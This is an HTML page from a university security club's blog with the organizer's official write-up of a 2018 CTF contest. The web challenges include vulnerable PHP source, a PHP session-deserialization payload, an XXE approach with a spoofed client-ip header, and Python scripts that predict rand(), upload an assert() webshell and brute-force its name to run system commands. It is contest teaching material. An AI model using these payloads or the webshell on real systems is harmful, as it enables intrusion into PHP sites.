@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="XMUTSEC">
+
+
+    <meta name="subtitle" content="Hack The Planet">
+
+
+    <meta name="description" content="厦门理工学院信息安全协会官网，这是一个热爱信息安全、网络安全等领域的团体">
+
+
+
+<title>举办2018MOCTF新春欢乐赛 | 厦门理工学院信息安全协会 - Hack The Planet</title>
+
+
+
+    <link rel="icon" href="/image/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">XMUTSEC</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/award">荣誉</a>
+                
+                    <a class="menu-item" href="/members">成员</a>
+                
+                    <a class="menu-item" href="/links">友联</a>
+                
+                    <a class="menu-item" href="/join">加入我们</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">XMUTSEC</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/award">荣誉</a>
+                
+                    <a class="menu-item" href="/members">成员</a>
+                
+                    <a class="menu-item" href="/links">友联</a>
+                
+                    <a class="menu-item" href="/join">加入我们</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">举办2018MOCTF新春欢乐赛</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">XMUTSEC</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 13, 2018&nbsp;&nbsp;17:00:04</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>从放假到现在筹办准备了接近两个星期的MOCTF新春欢乐赛终于落幕啦，这次比赛我一共出了1签到+1MISC+3WEB，下面先放官方WriteUp（哇终于能当一回官方了）</p>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h3 id="签到-20"><a href="#签到-20" class="headerlink" title="签到 20"></a>签到 20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">支付宝今年集齐五福能一起平分多少钱？</span><br><span class="line">flag格式：moctf&#123;数字&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:moctf{500000000}</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="空word-100"><a href="#空word-100" class="headerlink" title="空word 100"></a>空word 100</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的什么都没有吗</span><br></pre></td></tr></table></figure>
+
+<p>文件是个word<br>打开看发现一些奇怪的换行和tab<br><img src="https://www.codemonster.cn/img/2018moctf1.png" alt="img"><br>很容易想到是摩斯密码，替换后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -..</span><br></pre></td></tr></table></figure>
+
+
+
+<p>解摩斯密码，然后hex转字符串得到flag</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="登录一哈-300"><a href="#登录一哈-300" class="headerlink" title="登录一哈 300"></a>登录一哈 300</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录一下，你就知道。</span><br><span class="line">http://111.230.32.124:6001/</span><br></pre></td></tr></table></figure>
+
+<p>源码放到git里泄露给大家了<br>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">        $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">        $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">        $_SESSION[&quot;username&quot;] = $username;</span><br><span class="line">        header(&quot;Location:./index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        echo &#x27;&lt;h1&gt;hello &#x27;.$_SESSION[&quot;username&quot;].&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">class MOCTF&#123;</span><br><span class="line">    public $flag;</span><br><span class="line">    public $name;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;flag = &quot;moctf&#123;xxxxxxxxxxxxxxxx&#125;&quot;;</span><br><span class="line">        if($this-&gt;flag == $this-&gt;name)&#123;</span><br><span class="line">            echo &quot;Wow,this is flag:&quot;.$this-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看源码就可以知道这道题考查的是session反序列漏洞了<br>在index.php中php的序列化handler是’php_binary’，而flag.php里没有设置，就是默认的’php’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考<a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br>index.php中的<code>$_session[&#39;username&#39;]</code>可控，我们就能构造payload到session，<br>然后访问flag.php页面就能触发反序列化执行<code>__destruct</code>了，<br>这里还有个考点是<code>$this-&gt;flag == $this-&gt;name</code>，通过引用的方式绕过。<br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new MOCTF();</span><br><span class="line">$a-&gt;name = &amp;$a-&gt;flag;</span><br><span class="line">echo &#x27;|&#x27;.serialize($a);</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提交到index.php的username，然后访问flag.php就得到flag了</p>
+<h3 id="字符串检查-400"><a href="#字符串检查-400" class="headerlink" title="字符串检查 400"></a>字符串检查 400</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">来检查一下你的字符串是否格式良好吧！</span><br><span class="line">http://111.230.32.124:6002/</span><br></pre></td></tr></table></figure>
+
+<p>原意是xxe漏洞读取任意文件<br>后来知道师傅们卡了很久貌似是因为<code>client-ip</code>的原因，我的锅<br>题目打开是个json字符串验证的页面，POST包的<code>Content-Type</code>字段是<code>application/json</code>，<br>POST后接口会返回json格式正确或错误的结果<br>改成<code>application/xml</code>，接口提示只允许本机访问，于是构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-ip:localhost</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后就是xxe盲打漏洞了，参考<a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a><br>这里我只限制了payload长度为170以内，其实完全可以更短的，希望大佬们可以测试测试<br>最后flag在&#x2F;etc&#x2F;passwd</p>
+<h3 id="简单审计-400"><a href="#简单审计-400" class="headerlink" title="简单审计 400"></a>简单审计 400</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码都给你了，还说不会做？</span><br><span class="line">http://120.78.57.208:6005/</span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">function get_rand_code($l = 6) &#123;</span><br><span class="line">    $result = &#x27;&#x27;;</span><br><span class="line">    while($l--) &#123;</span><br><span class="line">        $result .= chr(rand(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;)));</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_rand_code() &#123;</span><br><span class="line">    $ip=$_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">    $code=get_rand_code();</span><br><span class="line">    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">    @socket_connect($socket, $ip, 8888);</span><br><span class="line">    @socket_write($socket, $code.PHP_EOL);</span><br><span class="line">    @socket_close($socket);</span><br><span class="line">    die(&#x27;test ok!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($filename, $content,$savepath) &#123;</span><br><span class="line">    $AllowedExt = array(&#x27;bmp&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;);</span><br><span class="line">    if(!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(&#x27;.&#x27;, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!in_array(strtolower($filename[count($filename)-1]),$AllowedExt))&#123;</span><br><span class="line">        die(&#x27;error ext!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $code=get_rand_code();</span><br><span class="line">    $finalname=$filename[0].&#x27;moctf&#x27;.$code.&quot;.&quot;.end($filename);</span><br><span class="line">    file_put_contents(&quot;$savepath&quot;.$finalname, $content);</span><br><span class="line">    usleep(3000000);</span><br><span class="line">    unlink(&quot;$savepath&quot;.$finalname);</span><br><span class="line">    die(&#x27;upload over!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$savepath=&quot;uploads/&quot;.sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&quot;/&quot;;</span><br><span class="line">if(!is_dir($savepath))&#123;</span><br><span class="line">    $oldmask = umask(0);</span><br><span class="line">    mkdir($savepath, 0777);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;action&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $act=$_GET[&#x27;action&#x27;];</span><br><span class="line">    if($act===&#x27;upload&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename=$_POST[&#x27;filename&#x27;];</span><br><span class="line">        if(!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(&#x27;.&#x27;, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $content=$_POST[&#x27;content&#x27;];</span><br><span class="line">        waf($content);</span><br><span class="line">        upload($filename,$content,$savepath);</span><br><span class="line">    &#125;</span><br><span class="line">    else if($act===&#x27;test&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        test_rand_code();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>解释一下题目的意思<br>根据action执行对应操作，<code>action=test</code>会调用<code>test_rand_code</code>函数发送tcp包到访客的ip<br><code>action=upload</code>时会写入一个文件，文件内容有waf拦截，文件名有白名单限制后缀，<br>然后拼接文件名加入rand的字符串，写入文件，文件写入后过3秒unlink删除<br>有问题的点有这几个<br>1.filename检查是用<code>$filename[count($filename)-1]</code>取的后缀，是按照下标取的，而写入文件时用的是<code>end($filename)</code>，是取最后一个元素，只要post时提交<code>filename[1]=jpg&amp;filename[0]=php</code>就能绕过了<br>2.$content的waf绕过， 绕过即可<br>3.使用rand()生成随机数，可以被预测，参考<a target="_blank" rel="noopener" href="https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/">https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></p>
+<p>预期解法是<br>1.username数组bypass后缀检查，绕过content的waf<br>2.rand随机数预测+爆破文件名 在unlink之前访问shell<br>结果大佬们直接非预期解bypass了<code>unlink</code>打扰了<br>非预期解参考<a target="_blank" rel="noopener" href="http://skysec.top/2018/02/13/happymoctf%E4%B9%8Bweb%E5%85%A8%E9%A2%98%E8%A7%A3/">一叶飘零</a>师傅的WriteUp<br>预期解如下<br>写两个脚本，<br>listen.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">#监听8888端口，接受6个`get_rand_code`的结果，然后预测接下来一次`get_rand_code`的结果，这里可能不会很准确，</span><br><span class="line">#所以需要小幅度爆破，复杂度大概为3^6，反正就跑着呗</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#by xishir</span><br><span class="line">import requests as req</span><br><span class="line">import re</span><br><span class="line">from socket import *  </span><br><span class="line">from time import ctime  </span><br><span class="line">import random</span><br><span class="line">import itertools as its</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">r=req.session()</span><br><span class="line">url=&quot;http://120.78.57.208:6005/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_rand_list():</span><br><span class="line">    HOST = &#x27;&#x27;  </span><br><span class="line">    PORT = 8888</span><br><span class="line">    BUFSIZ = 128  </span><br><span class="line">    ADDR = (HOST, PORT)  </span><br><span class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    tcpSerSock.bind(ADDR)</span><br><span class="line">    tcpSerSock.listen(5)</span><br><span class="line">    rand_num=0</span><br><span class="line">    l=[]</span><br><span class="line">    while True:</span><br><span class="line">        tcpCliSock, addr = tcpSerSock.accept()  </span><br><span class="line">        while True:  </span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)  </span><br><span class="line">            if not data:  </span><br><span class="line">                break  </span><br><span class="line">            data=data[0:6]</span><br><span class="line">	    print data,l</span><br><span class="line">            for i in data:</span><br><span class="line">                l.append(ord(i)+1-ord(&#x27;a&#x27;))</span><br><span class="line">        rand_num+=1</span><br><span class="line">      	if rand_num==6:</span><br><span class="line">      		break</span><br><span class="line">    tcpCliSock.close()  </span><br><span class="line">    tcpSerSock.close()</span><br><span class="line">    return l</span><br><span class="line"></span><br><span class="line">def get_salt(l):</span><br><span class="line">    salt=&quot;&quot;</span><br><span class="line">    for i in range(6):</span><br><span class="line">        j=len(l)</span><br><span class="line">        r=(l[j-3]+l[j-31])-1</span><br><span class="line">        if r&gt;26:</span><br><span class="line">        	r-=26</span><br><span class="line">        #print l[j-3],chr(l[j-3]+ord(&#x27;a&#x27;)-1),l[j-31],chr(l[j-31]+ord(&#x27;a&#x27;)-1),r,chr(r+ord(&#x27;a&#x27;)-1)</span><br><span class="line">        l.append(r)</span><br><span class="line">        salt+=chr(r+ord(&#x27;a&#x27;)-1)</span><br><span class="line">        #print salt</span><br><span class="line">    return salt</span><br><span class="line"></span><br><span class="line">def get_flag(salt):</span><br><span class="line">    s=hashlib.sha1(&#x27;119.23.73.3&#x27;).hexdigest()</span><br><span class="line">    url1=url+&#x27;/uploads/&#x27;+s+&#x27;/&#x27;+&#x27;moctf&#x27;+salt+&#x27;.php&#x27;</span><br><span class="line">    data=&#123;&quot;a&quot;:&quot;system(&#x27;cat ../../flag.php&#x27;);echo &#x27;666666&#x27;;&quot;&#125;</span><br><span class="line">    r2=r.post(url1,data=data)</span><br><span class="line">    print salt</span><br><span class="line">    if &#x27;404&#x27; not in r2.text:</span><br><span class="line">    	print r2.text</span><br><span class="line"></span><br><span class="line">get_flag(&#x27;aaaaaa&#x27;)</span><br><span class="line">l=get_rand_list()</span><br><span class="line">salt=get_salt(l)</span><br><span class="line">s=0</span><br><span class="line">for i in range(100000):</span><br><span class="line">	s=s+1</span><br><span class="line">print s</span><br><span class="line">words = &quot;10&quot;</span><br><span class="line">o=its.product(words,repeat=6)</span><br><span class="line">for i in o:</span><br><span class="line">	s=&quot;&quot;.join(i)</span><br><span class="line">	salt2=&quot;&quot;</span><br><span class="line">	for j in range(6):</span><br><span class="line">	    salt2+=chr(ord(salt[j])-int(s[j]))</span><br><span class="line">	get_flag(salt2)</span><br><span class="line">words = &quot;10&quot;</span><br><span class="line">o=its.product(words,repeat=6)</span><br><span class="line">for i in o:</span><br><span class="line">	s=&quot;&quot;.join(i)</span><br><span class="line">	salt2=&quot;&quot;</span><br><span class="line">	for j in range(6):</span><br><span class="line">	    salt2+=chr(ord(salt[j])+int(s[j]))</span><br><span class="line">	get_flag(salt2)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>put.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#通过`?action=test`调用`test_rand_code`函数发送6次`get_rand_code`结果，一共36个字符，</span><br><span class="line">#然后提交一个构造好的`?action=test`，上传shell到服务器，在被删除之前就会被listen爆破得到，没爆破到就多爆破几次</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#by xishir</span><br><span class="line">import requests as req</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r=req.session()</span><br><span class="line">url=&quot;http://120.78.57.208:6005/?action=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_test():</span><br><span class="line">    url2=url+&quot;test&quot;</span><br><span class="line">    r1=r.get(url2)</span><br><span class="line">    print url2</span><br><span class="line">    print r1.text</span><br><span class="line">def upload():</span><br><span class="line">    data=&#123;&quot;filename[4]&quot;:&quot;jpg&quot;,</span><br><span class="line">          &quot;filename[2]&quot;:&quot;jpg&quot;,</span><br><span class="line">          &quot;filename[1]&quot;:&quot;php&quot;,</span><br><span class="line">          &quot;content&quot;:&quot;&lt;script language=&#x27;php&#x27;&gt;assert($_POST[a]);&lt;/script&gt;&quot;,</span><br><span class="line">          &quot;a&quot;:&quot;system(&#x27;cat ../../flag.php&#x27;);&quot;</span><br><span class="line">          &#125;</span><br><span class="line">    url1=url+&quot;upload&quot;</span><br><span class="line">    r2=r.post(url1,data=data)</span><br><span class="line">    print r2.text</span><br><span class="line"></span><br><span class="line">for i in range(6):</span><br><span class="line">    get_test()</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果如下<br><img src="https://www.codemonster.cn/img/2018moctf2.png" alt="img"></p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>讲一下这次比赛我主要干了那些事吧</p>
+<ol>
+<li>出题，如上所述</li>
+<li>平台搭建，用的是ctfd，docker的方式搭建的，省了很多事</li>
+<li>题目部署，除了ping那题，其他的web都是我部署的，尤其是cms那题，反复部署的有点吐，中间有个集大学弟来帮忙，后面比赛的时候还是出了问题</li>
+<li>发布题目，emmmmmmmmmm，用ctfd的时候出现了很神奇的情况，在编辑config的时候使用谷歌的自动翻译，保存之后ctfd的web服务就挂掉啦！是个巨坑，现在还不知道咋回事</li>
+<li>比赛时候的放题，放hint，运维，水群，哈哈哈哈和大佬们玩耍还是很开心的<br>放一些后台数据<br><img src="https://www.codemonster.cn/img/2018moctf3.png" alt="img"><br><img src="https://www.codemonster.cn/img/2018moctf4.png" alt="img"><br><img src="https://www.codemonster.cn/img/2018moctf5.png" alt="img"></li>
+</ol>
+<p>原来只是想给我们学校和集大的学弟们体验比赛的，不过对外开放也吸引了许多师傅们来做题，虽然运维得很累，但也学到了很多东西（主要是非预期和部署各种奇葩环境）<br>打一波广告，<a target="_blank" rel="noopener" href="http://www.moctf.com/">http://www.moctf.com/</a><br>MOCTF平台是CodeMonster和Mokirin这两支CTF战队所搭建的一个CTF在线答题系统。题目形式与各大CTF比赛相同。目的是为两个学校中热爱信息安全的同学们提供一个刷题的平台，能够一起学习、进步。</p>
+<p>最后祝大家新年快乐！<br><img src="https://www.codemonster.cn/img/2018moctf6.png" alt="img"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>XMUTSEC</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
